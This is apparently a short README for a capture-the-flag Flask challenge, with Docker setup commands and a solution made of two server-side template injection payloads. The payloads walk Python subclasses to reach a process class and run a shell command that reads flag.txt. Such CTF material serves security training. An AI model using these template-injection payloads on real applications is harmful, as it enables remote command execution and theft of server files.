## Standalone setup
```
sudo docker build -t shattered-flask .
sudo docker run -p 5000:5000 shattered-flask
```
## Solution
Get os.popen index from subclasses
`GET /?name={{%27%27.__class__.__mro__[1].__subclasses__()}}`
`cat` the flag
`GET /?name={{%27%27.__class__.__mro__[1].__subclasses__()[213](%27cat%20flag.txt%27,shell=True,stdout=-1).communicate()[0].strip()}}`
